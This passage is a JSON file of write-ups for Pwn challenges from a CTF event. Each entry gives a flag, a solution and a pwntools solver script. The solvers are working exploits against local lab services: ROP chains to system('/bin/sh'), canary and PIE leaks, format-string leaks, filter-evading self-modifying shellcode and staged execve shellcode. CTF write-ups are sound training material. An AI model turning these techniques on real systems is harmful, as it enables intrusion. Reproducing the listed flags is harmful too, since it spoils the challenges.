@@ -1,0 +1,335 @@
+[
+  {
+    "slug": "better-call-wawa",
+    "title": "BETTER CALL WAWA",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "Some names never leave the contact list.\n\nWhen every Rockstar line went silent, one number still answered: WAWA. CyberLeek has one call to trace the signal, reach the archive, and bring the leak home.",
+    "tags": [
+      "ret2libc",
+      "rop"
+    ],
+    "flag": "Securinets{B3TT3R_C4LL_W4W4_6G_YALLLA}",
+    "writeup": "## Solution\n\nThe program discloses the address of `stdout`, which gives the libc base by\nsubtracting the bundled libc's `_IO_2_1_stdout_` offset. The 72-byte read into a\n32-byte stack buffer also reaches the saved return address at offset 40.\n\nBuild a libc ROP chain with an alignment `ret`, `pop rdi; ret`, the address of\n`/bin/sh`, and `system`. After the function returns into the chain, send\n`cat flag.txt` through the resulting shell.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.binary = ELF(\"./main\", checksec=False)\ncontext.log_level = \"error\"\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\np = remote(\"127.0.0.1\", 9010)\n\np.recvuntil(b\"WAWA'S LINE: \")\nleak = int(p.recvline(), 16)\nlibc.address = leak - libc.sym[\"_IO_2_1_stdout_\"]\n\nrop = ROP(libc)\nret = rop.find_gadget([\"ret\"]).address\npop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\nbin_sh = next(libc.search(b\"/bin/sh\\x00\"))\n\npayload = b\"A\" * 40\npayload += p64(ret)\npayload += p64(pop_rdi)\npayload += p64(bin_sh)\npayload += p64(libc.sym.system)\n\np.sendafter(b\"message:\\n\", payload)\np.sendline(b\"cat flag.txt\")\np.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + p.recvuntil(b\"}\")\nprint(flag.decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "chops-last-fetch",
+    "title": "Chop's Last Fetch",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "CyberLeek entrusted the final piece of the GTA VI build to the only courier in Los Santos who could never be bribed, traced, or questioned.\n\nChop still has the drop, but he only listens to handlers who can follow every command without falling behind. Keep up, and he may return with more than a stick.",
+    "tags": [
+      "pwntools"
+    ],
+    "flag": "Securinets{g00d_b0y_ch0p_br0ught_b4ck_th3_bu1ld}",
+    "writeup": "## Solution\n\nThis is a timed parser challenge. For each of 45 rounds, read the exact package\nlength and apply every command from left to right. `FETCH` leaves the bytes alone;\nthe remaining operations reverse, change case, repeat, rotate left, slice with an\nexclusive end, sort, XOR into lowercase hexadecimal, or return the byte count.\n\nUsing the advertised package length avoids delimiter mistakes. Send the transformed\nbytes before the two-second alarm on every round to receive the flag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\n\ndef solve_command(data, command):\n    commands = command.split(b\" | \")\n\n    for current in commands:\n        words = current.split()\n\n        if words[0] == b\"FETCH\":\n            pass\n        elif words[0] == b\"REVERSE\":\n            data = data[::-1]\n        elif words[0] == b\"BARK\":\n            data = data.upper()\n        elif words[0] == b\"WHISPER\":\n            data = data.lower()\n        elif words[0] == b\"REPEAT\":\n            data = data * int(words[1])\n        elif words[0] == b\"ROTATE\":\n            amount = int(words[1])\n            data = data[amount:] + data[:amount]\n        elif words[0] == b\"SLICE\":\n            start = int(words[1])\n            end = int(words[2])\n            data = data[start:end]\n        elif words[0] == b\"SORT\":\n            data = bytes(sorted(data))\n        elif words[0] == b\"XOR\":\n            key = int(words[1])\n            data = bytes(byte ^ key for byte in data).hex().encode()\n        elif words[0] == b\"COUNT\":\n            data = str(len(data)).encode()\n\n    return data\n\n\nio = remote(\"127.0.0.1\", 9003)\n\nfor _ in range(45):\n    io.recvuntil(b\"COMMAND: \")\n    command = io.recvline().strip()\n\n    io.recvuntil(b\"PACKAGE SIZE: \")\n    package_size = int(io.recvline())\n\n    io.recvuntil(b\"PACKAGE: \")\n    package = io.recvn(package_size)\n\n    answer = solve_command(package, command)\n    io.sendlineafter(b\"CHOP RETURNS: \", answer)\n\nio.recvuntil(b\"CHOP'S LAST FETCH:\\n\")\nflag = io.recvline().decode().strip()\nprint(flag)\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "cyberleek-hotline",
+    "title": "Cyberleek Hotline",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 100,
+    "difficulty": 1,
+    "description": "Cyberleek loves using netcat, so use it to cooperate with him.",
+    "tags": [
+      "netcat"
+    ],
+    "flag": "Securinets{n3tc4t_m4d3_m3_cyb3rl33ks_4cc0mpl1c3}",
+    "writeup": "## Solution\n\nThere is no exploitation step: after accepting a connection, the service opens\n`flag.txt` and prints it. Connect and read until EOF.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9016)\nprint(p.recvall().decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "cyberleeks-burner",
+    "title": "CyberLeek's Burner",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "CyberLeek's burner phone has started receiving fragments from somewhere inside Vice City. Every transmission disappears almost immediately, and the sender refuses to repeat anything.",
+    "tags": [
+      "pwntools"
+    ],
+    "flag": "Securinets{th3_burn3r_n3v3r_st0pp3d_r1ng1ng}",
+    "writeup": "## Solution\n\nThe service emits eight random transmissions between `BEGIN LEAK` and `END LEAK`.\nCapture each line and return it unchanged at the `RETURN LEAK` prompt before the\ntwo-second alarm expires. Eight exact echoes unlock the flag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\nio = remote(\"127.0.0.1\", 9002)\n\nfor _ in range(8):\n    io.recvuntil(b\"BEGIN LEAK\\n\")\n    leak = io.recvline().strip()\n    io.sendlineafter(b\"RETURN LEAK: \", leak)\n\nio.recvuntil(b\"LEAK RECOVERED:\\n\")\nprint(io.recvline().decode().strip())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "cyberleeks-final-upload",
+    "title": "CyberLeek's Final Upload",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "The final GTA VI archive is already leaving Rockstar's internal network. CyberLeek reached the relay, but the interface was destroyed and the upload continues as an unreadable stream.\n\nKeep the last copy of the build from disappearing!",
+    "tags": [
+      "binary-protocol",
+      "automation"
+    ],
+    "flag": "Securinets{r4w_fr4m3s_c4rr13d_th3_f1n4l_bu1ld}",
+    "writeup": "## Solution\n\nTreat the connection as a binary stream because each frame is deliberately split\nacross short writes. Read `LEEK`, then the big-endian sequence, operation, payload\nlength, payload, and checksum. Verify that the checksum is the 32-bit sum of the\npayload bytes.\n\nApply the requested operation: reverse, XOR, rotate left, sort, or byte-wise add.\nFor XOR, rotate, and add, the first payload byte is the key rather than data. Reply\nwith `ACK!`, the original sequence, result length, result, and its big-endian\nchecksum. Processing all 32 frames reveals the flag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\nio = remote(\"127.0.0.1\", 9004)\nio.recvuntil(b\"BEGIN UPLOAD\\n\")\n\nfor _ in range(32):\n    io.recvuntil(b\"LEEK\")\n\n    sequence = u16(io.recvn(2), endian=\"big\")\n    operation = io.recvn(1)[0]\n    length = u16(io.recvn(2), endian=\"big\")\n    payload = io.recvn(length)\n    received_sum = u32(io.recvn(4), endian=\"big\")\n\n    assert received_sum == sum(payload) & 0xffffffff\n\n    data = payload\n    if operation in (2, 3, 5):\n        key = payload[0]\n        data = payload[1:]\n\n    if operation == 1:\n        result = data[::-1]\n    elif operation == 2:\n        result = bytes(byte ^ key for byte in data)\n    elif operation == 3:\n        shift = key % len(data)\n        result = data[shift:] + data[:shift]\n    elif operation == 4:\n        result = bytes(sorted(data))\n    else:\n        result = bytes((byte + key) & 0xff for byte in data)\n\n    reply = b\"ACK!\"\n    reply += p16(sequence, endian=\"big\")\n    reply += p16(len(result), endian=\"big\")\n    reply += result\n    reply += p32(sum(result) & 0xffffffff, endian=\"big\")\n    io.send(reply)\n\nio.recvuntil(b\"UPLOAD COMPLETE\\n\")\nprint(io.recvline().decode().strip())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "drop-a-pin",
+    "title": "Drop a Pin",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 100,
+    "difficulty": 1,
+    "description": "The getaway driver refuses to move without an exact pickup point. Give him the right location and CyberLeek's next upload is yours. Miss by one street and enjoy the wanted screen.",
+    "tags": [
+      "ret2win"
+    ],
+    "flag": "Securinets{th3_g3t4w4y_dr1v3r_n33d3d_4n_3x4ct_p1n}",
+    "writeup": "## Solution\n\nThe binary reads a hexadecimal value, casts it to a function pointer, and accepts it\nonly when it equals `final_upload`. PIE is disabled, so resolve that symbol directly\nfrom the ELF and submit its address. The indirect call then enters the flag-printing\nfunction.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9014)\n\naddress = elf.sym[\"final_upload\"]\np.sendlineafter(b\"> \", hex(address).encode())\n\nprint(p.recvall().decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "full-heat",
+    "title": "Full Heat",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 500,
+    "difficulty": 3,
+    "description": "Rockstar put all of Leonida on lockdown. Surely that will stop CyberLeek this time.",
+    "tags": [
+      "canary-leak",
+      "pie-leak",
+      "rop"
+    ],
+    "flag": "Securinets{r0ckst4r_c4ll3d_1t_4_s3cur1ty_t3st_cyb3rl33k_c4ll3d_1t_tu3sd4y}",
+    "writeup": "## Solution\n\nThe XOR archive output provides both required leaks. First send 41 known bytes: the\nextra byte passes the stack canary's leading null, so XOR-decoding the next seven\nbytes recovers the canary. Preserve it in a one-byte partial return overwrite that\nre-enters the report path. On the second pass, 56 known bytes let the archive output\ncontinue into the saved return address, revealing the PIE base.\n\nWith PIE known, return through `broadcast`. Its by-value `Broadcast` argument is\nread from the stack, giving a call primitive: set its message to `read@got` and its\nfunction pointer to `puts@plt`, then re-enter once more. Convert that leak into the\nlibc base. A final `broadcast` frame uses `/bin/sh` as the message and `system`\nas the callback, while preserving the recovered canary.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.binary = elf = ELF(\"./main\", checksec=False)\ncontext.log_level = \"error\"\nlibc = ELF(\"./libc.so.6\", checksec=False)\nkey = b\"\\x5a\"\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9012)\n\ncanary_leak = b\"A\" * 41\np.sendafter(b\"> \", canary_leak)\np.recvuntil(xor(canary_leak, key))\ncanary = u64(b\"\\0\" + xor(p.recvn(7), key))\n\nrestart = b\"B\" * 40 + p64(canary) + b\"C\" * 8 + p8(0x9a)\np.sendafter(b\"> \", restart)\n\npie_leak = b\"D\" * 56\np.sendafter(b\"> \", pie_leak)\np.recvuntil(xor(pie_leak, key))\npie = u64(xor(p.recvn(6), key).ljust(8, b\"\\0\"))\nelf.address = pie - 0x10a6\n\nret = elf.address + 0x101a\ndispatch = elf.address + 0x12d0\nreenter = elf.address + 0x109a\n\nleak_read = flat(\n    b\"E\" * 40,\n    canary,\n    b\"F\" * 8,\n    ret,\n    dispatch,\n    reenter,\n    0,\n    elf.got[\"read\"],\n    elf.plt[\"puts\"],\n)\n\np.sendafter(b\"> \", leak_read)\nread_address = u64(p.recvline()[:-1].ljust(8, b\"\\0\"))\nlibc.address = read_address - libc.sym[\"read\"]\n\nclean_report = b\"G\" * 40\np.sendafter(b\"> \", clean_report)\n\nshell = flat(\n    b\"H\" * 40,\n    canary,\n    b\"I\" * 8,\n    ret,\n    dispatch,\n    libc.sym[\"exit\"],\n    0,\n    next(libc.search(b\"/bin/sh\\0\")),\n    libc.sym[\"system\"],\n)\n\np.sendafter(b\"> \", shell)\nsleep(0.2)\np.sendline(b\"cat flag.txt\")\np.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + p.recvuntil(b\"}\")\nprint(flag.decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "night-shift",
+    "title": "Night Shift",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 300,
+    "difficulty": 3,
+    "description": "The night desk is open.",
+    "tags": [
+      "fd-reuse",
+      "integer-overflow"
+    ],
+    "flag": "Securinets{th3_n1ght_sh1ft_n3v3r_cl0s3s}",
+    "writeup": "## Solution\n\nRegistering a parcel creates a close-on-exec memfd. Cancelling it closes the file\ndescriptor but leaves the slot's descriptor number behind. Inspecting the archive\nthen opens `/flag`, and the kernel reuses that newly freed descriptor number.\n\nThe extension price is calculated in 32-bit arithmetic. Supplying `0x10000010`\nseconds makes `seconds * 16` wrap to an affordable value while setting a future\nexpiry even for the inactive slot. Authorizing that slot clears `FD_CLOEXEC` on\nthe reused flag descriptor; dispatching the courier inherits it and prints the flag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\nio = remote(\"127.0.0.1\", 9075)\n\nio.sendlineafter(b\"> \", b\"1\")\nio.recvuntil(b\"Parcel ID: \")\nidentifier = int(io.recvline())\n\nio.sendlineafter(b\"> \", b\"3\")\nio.sendlineafter(b\"Parcel ID: \", str(identifier).encode())\n\nio.sendlineafter(b\"> \", b\"5\")\n\nio.sendlineafter(b\"> \", b\"4\")\nio.sendlineafter(b\"Parcel ID: \", str(identifier).encode())\nio.sendlineafter(b\"Seconds: \", str(0x10000010).encode())\n\nio.sendlineafter(b\"> \", b\"6\")\nio.sendlineafter(b\"Parcel ID: \", str(identifier).encode())\n\nio.sendlineafter(b\"> \", b\"7\")\nio.sendlineafter(b\"Parcel ID: \", str(identifier).encode())\n\nio.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + io.recvuntil(b\"}\")\nprint(flag.decode())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "off-the-radar",
+    "title": "Off the Radar",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 100,
+    "difficulty": 1,
+    "description": "Rockstar's new wanted system knows more than how many stars you have. CyberLeek is visible, identified, trapped inside the search area, and still carrying heat.\n\nBefore the next build leaves Leonida, every trace has to disappear.",
+    "tags": [
+      "overflow"
+    ],
+    "flag": "Securinets{https://x.com/veloraJade/status/2094329801213649330}",
+    "writeup": "## Solution\n\nThe program reads exactly 32 bytes into `alias`, but the adjacent fields are part of\nthe same structure and are therefore controllable through one contiguous input.\nFill the alias, write `NONE` over the four-byte stars field, and append three\nlittle-endian zero integers for `visible`, `identified`, and `inside_area`.\nSatisfying all four checks calls `release_archive`.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9011)\n\npayload = b\"CyberLeek\".ljust(32, b\"\\x00\")\npayload += b\"NONE\"\npayload += p32(0) * 3\n\np.sendafter(b\"alias:\\n\", payload)\np.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + p.recvuntil(b\"}\")\nprint(flag.decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "one-star-gateway",
+    "title": "GATEWAY",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "A burner call exposed one live Rockstar location. CyberLeek has one shot to enter the archive, steal the build, and disappear before the line goes dead.",
+    "tags": [
+      "libc-leak",
+      "one-gadget"
+    ],
+    "flag": "Securinets{0n3_l34k_0n3_sh0t_z3r0_w4nt3d_st4rs}",
+    "writeup": "## Solution\n\nThe service leaks `puts` before reading 33 bytes into a 16-byte stack buffer.\nSubtract the bundled libc's `puts` offset to recover the libc base. The saved return\naddress is reached after the buffer and saved frame pointer.\n\nOverwrite the saved frame pointer with writable space in `garage` and the return\naddress with the compatible libc one-gadget at offset `0xebd43`. Once it spawns a\nshell, read `flag.txt`.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\np = remote(\"127.0.0.1\", 9009)\n\np.recvuntil(b\"wipe: \")\nputs = int(p.recvline(), 16)\nlibc.address = puts - libc.sym.puts\n\none_gadget = libc.address + 0xebd43\nfake_rbp = elf.sym.garage + 0x200\n\npayload = b\"route\\x00\".ljust(16, b\"A\")\npayload += p64(fake_rbp)\npayload += p64(one_gadget)\n\np.sendafter(b\"route:\\n\", payload)\np.sendline(b\"cat flag.txt\")\np.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + p.recvuntil(b\"}\")\nprint(flag.decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "one-street-over",
+    "title": "One Street Over",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "CyberLeek's escape route was almost perfect. The final build is not across Leonida. It is only one street away from where the driver planned to return.",
+    "tags": [
+      "partial-overwrite"
+    ],
+    "flag": "Securinets{0n3_byt3_0n3_str33t_0n3_f1n4l_l34k}",
+    "writeup": "## Solution\n\n`receive_route` forces a 41-byte read into a 32-byte buffer. Forty padding bytes\nreach the saved return address, but only its least-significant byte can be changed.\nBecause the binary is non-PIE and the relevant code is aligned within the same\naddress region, replace that byte with the low byte of `enter_the_safehouse`. The\npartial overwrite redirects execution to the flag-printing function.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\n\nio = remote(\"127.0.0.1\", 9007)\n\npayload = b\"A\" * 40\npayload += p8(elf.symbols[\"enter_the_safehouse\"] & 0xff)\n\nio.sendafter(b\"FINAL TURN: \", payload)\nio.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + io.recvuntil(b\"}\")\nprint(flag.decode())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "one-time-inspection",
+    "title": "Works on My Machine",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 300,
+    "difficulty": 3,
+    "description": "It worked perfectly on the developer's laptop.\n\nIf it misbehaves now, that sounds impressively like your problem.",
+    "tags": [
+      "shellcode",
+      "self-modifying-code"
+    ],
+    "flag": "Securinets{https://youtube.com/shorts/2zGjBVnwL-E?si=Kz4aJHUvH2l0ccQW}",
+    "writeup": "## Solution\n\nThe service executes code from an RWX mapping but rejects literal `syscall`,\n`int 0x80`, and `sysenter` opcode pairs. The mapping is writable during\nexecution, so place `00 05` at the future syscall site and begin with a small\nself-modifying stub that changes the first byte to `0f`.\n\nThe remaining shellcode constructs `/bin//sh`, sets up `execve`, and falls into\nthe newly created `0f 05`. The forbidden sequence never appears in the submitted\npayload, but it exists by the time execution reaches it.",
+    "solver": "#!/usr/bin/env python3\n\nfrom pwn import *\n\n\ncontext.arch = \"amd64\"\ncontext.log_level = \"error\"\n\nhost = args.HOST or \"127.0.0.1\"\nport = int(args.PORT or 20019)\n\npayload = asm(\n    \"\"\"\n    lea rbx, [rip + gate]\n    mov byte ptr [rbx], 0x0f\n    xor eax, eax\n    push rax\n    mov rbx, 0x68732f2f6e69622f\n    push rbx\n    mov rdi, rsp\n    push rax\n    push rdi\n    mov rsi, rsp\n    xor edx, edx\n    mov al, 59\ngate:\n    .byte 0x00, 0x05\n    \"\"\"\n)\n\nfor forbidden in (b\"\\x0f\\x05\", b\"\\xcd\\x80\", b\"\\x0f\\x34\"):\n    assert forbidden not in payload\n\nio = process(\"./main\") if args.LOCAL else remote(host, port)\nio.sendlineafter(b\"Size: \", str(len(payload)).encode())\nio.sendafter(b\"Data: \", payload)\nio.recvuntil(b\"Fine. Running it.\\n\")\nio.sendline(b\"cat flag.txt 2>/dev/null || cat /flag.txt; exit\")\nprint(io.recvuntil(b\"}\").decode().strip())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "radio-silence",
+    "title": "RADIO",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 500,
+    "difficulty": 3,
+    "description": "Rockstar says the signal is gone. CyberLeek disagrees.",
+    "tags": [
+      "format-string",
+      "ret2libc"
+    ],
+    "flag": "Securinets{luc14s_j1ggl3_1s_20GB_0r_20480MB}",
+    "writeup": "## Solution\n\nThe first input is used both as a decimal frequency and as a restricted format\nstring. Brute-force the 16-bit frequency whose `route_tag` equals `0x30db734f`;\nthat route receives the known eight-byte clearance value `jiggly!!`. Append\n`%41$p` to the decimal frequency so the route still parses while the format string\nleaks the supplied `puts` pointer, then recover the libc base.\n\nThe selected channel accepts an overflowing transmission. Send 16 padding bytes,\nthe known clearance in the canary slot, 16 more padding bytes, and a libc ROP chain\nthat calls `system(\"/bin/sh\")`.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.binary = ELF(\"./main\", checksec=False)\ncontext.log_level = \"error\"\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\n\ndef route_tag(number):\n    number ^= number >> 16\n    number = number * 0x7feb352d & 0xffffffff\n    number ^= number >> 15\n    number = number * 0x846ca68b & 0xffffffff\n    number ^= number >> 16\n    return number\n\n\nfrequency = 0\nwhile route_tag(frequency) != 0x30db734f:\n    frequency += 1\n\ncanary = b\"jiggly!!\"\nroute = f\"{frequency} %41$p\".encode()\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9015)\n\np.sendlineafter(b\"> \", route)\np.recvuntil(b\"ENCRYPTED ROUTE ECHO:\\n\")\nputs = int(p.recvline().split()[-1], 16)\nlibc.address = puts - libc.sym[\"puts\"]\n\nrop = ROP(libc)\npop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\nret = rop.find_gadget([\"ret\"]).address\nbin_sh = next(libc.search(b\"/bin/sh\\0\"))\n\npayload = flat(\n    b\"A\" * 16,\n    canary,\n    b\"B\" * 16,\n    pop_rdi,\n    bin_sh,\n    ret,\n    libc.sym[\"system\"],\n)\n\np.sendlineafter(b\"> \", payload)\nsleep(0.2)\np.sendline(b\"cat flag.txt\")\np.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + p.recvuntil(b\"}\")\nprint(flag.decode())\np.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "skip-intro",
+    "title": "skiiiiiip",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "Rockstar's archive always begins with one final security sequence. Anyone who watches from the first frame is immediately removed.\n\nCyberLeek was never interested in introductions. The real leak begins afterward.",
+    "tags": [
+      "ret2win"
+    ],
+    "flag": "Securinets{sk1pp3d_th3_1ntr0_st0l3_th3_bu1ld}",
+    "writeup": "## Solution\n\nThe fixed 48-byte read reaches the saved return address at offset 40. Calling `win`\nnormally would fail its three argument checks, but jumping to `win + 0x38` skips\nthe validation and lands in the path-decoding and file-reading portion of the\nfunction. Submit 40 padding bytes followed by that internal address.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\n\nio = remote(\"127.0.0.1\", 9005)\n\npayload = b\"A\" * 40\npayload += p64(elf.symbols[\"win\"] + 0x38)\n\nio.sendafter(b\"SKIP: \", payload)\nio.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + io.recvuntil(b\"}\")\nprint(flag.decode())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "the-first-leek",
+    "title": "The First Leek",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "Rockstar called it a rumor. CyberLeek called it Tuesday.\n\nSomething from GTA VI escaped into the streets of Leonida, and everyone who shared it has gone silent. Before disappearing, CyberLeek left one final message:\n\n> They can stop the leak. They cannot stop the leek.\n\nRecover the proof before the takedown arrives.",
+    "tags": [
+      "SHELL"
+    ],
+    "flag": "Securinets{th3_f1rst_l34k_w4s_0nly_4_c4t_4w4y}",
+    "writeup": "## Solution\n\nThe challenge program immediately executes `/bin/sh`. Connect to the service and\nsend `cat flag.txt`; no memory-corruption step is required.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\nio = remote(args.HOST or \"localhost\", int(args.PORT or 9001))\nio.sendline(b\"cat flag.txt\")\nio.interactive()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "the-second-download",
+    "title": "2nd_download",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "Rockstar's relay records only the beginning of every transfer before launching it. CyberLeek knows the opening fragment was never meant to contain the entire build.\n\nIt only needs to make room for what comes next.",
+    "tags": [
+      "staged-shellcode"
+    ],
+    "flag": "Securinets{th3_s3c0nd_d0wnl04d_c4rr13d_th3_r34l_l34k}",
+    "writeup": "## Solution\n\nOnly four bytes are initially copied into an RWX mapping, but the function pointer\nis invoked with `stdin`, the mapping address, and `0x1000` already in\n`rdi`, `rsi`, and `rdx`. Use the four-byte stager `xor eax,eax; syscall` to\nperform `read(0, upload, 0x1000)`.\n\nThe second read overwrites the mapping. Put four disposable bytes first so execution\nresumes at offset four, followed there by normal `execve` shellcode that reads the\nflag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = \"amd64\"\ncontext.log_level = \"error\"\n\nio = remote(\"127.0.0.1\", 9008)\n\nstager = asm(\"xor eax, eax; syscall\")\nshellcode = asm(shellcraft.execve(\"/bin/sh\", [\"sh\", \"-c\", \"cat flag.txt\"], 0))\nsecond_stage = b\"A\" * 4 + shellcode\n\nio.sendafter(b\"FIRST FRAGMENT: \", stager + second_stage)\nio.recvuntil(b\"Securinets{\")\nflag = b\"Securinets{\" + io.recvuntil(b\"}\")\nprint(flag.decode())\nio.close()\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "the-spill",
+    "title": "The Spill",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 100,
+    "difficulty": 1,
+    "description": "Rockstar insists the situation is contained. CyberLeek recommends checking the floor.",
+    "tags": [
+      "overflow"
+    ],
+    "flag": "Securinets{0n3_sm4ll_sp1ll_0n3_v3ry_b4d_m0rn1ng}",
+    "writeup": "## Solution\n\n`Incident` stores a 32-byte report immediately before the `leaked` integer, while\n`read` accepts the size of the entire 36-byte structure. Send 33 nonzero bytes:\nthe first 32 fill the report and the final byte changes `leaked` from zero. The\ntruthy field causes `publish` to print the flag.",
+    "solver": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\n\np = process(\"./main\") if args.LOCAL else remote(\"127.0.0.1\", 9013)\n\np.sendlineafter(b\"> \", b\"A\" * 33)\nprint(p.recvall().decode())\n",
+    "solverLanguage": "python"
+  },
+  {
+    "slug": "unmarked-coordinates",
+    "title": "XYZ",
+    "category": "Pwn",
+    "collection": "Securinets Friendly CTF 2026",
+    "author": "r3t0x",
+    "date": "2026-09-28",
+    "points": 200,
+    "difficulty": 2,
+    "description": "Every time CyberLeek reconnects, Rockstar's relay broadcasts a different location. It arrives without a label, a sender, or instructions.\n\nSomewhere in Leonida, the final build is waiting for the right crew.",
+    "tags": [
+      "pie-leak",
+      "rop"
+    ],
+    "flag": "Securinets{unm4rk3d_c00rd1n4t3s_l3d_t0_th3_f1n4l_bu1ld}",
+    "writeup": "## Solution\n\nThe printed address of `leonida_relay` reveals the PIE base. The 200-byte read into\na 32-byte message buffer reaches the saved return address at offset 40, leaving room\nfor a full ROP chain.\n\nUse gadgets from the rebased binary to load the LUCIA, JASON, and CHOP constants into\n`rdi`, `rsi`, and `rdx`, then call `complete_the_handoff`. With all three\narguments correct, it decodes the flag path and prints the file.",
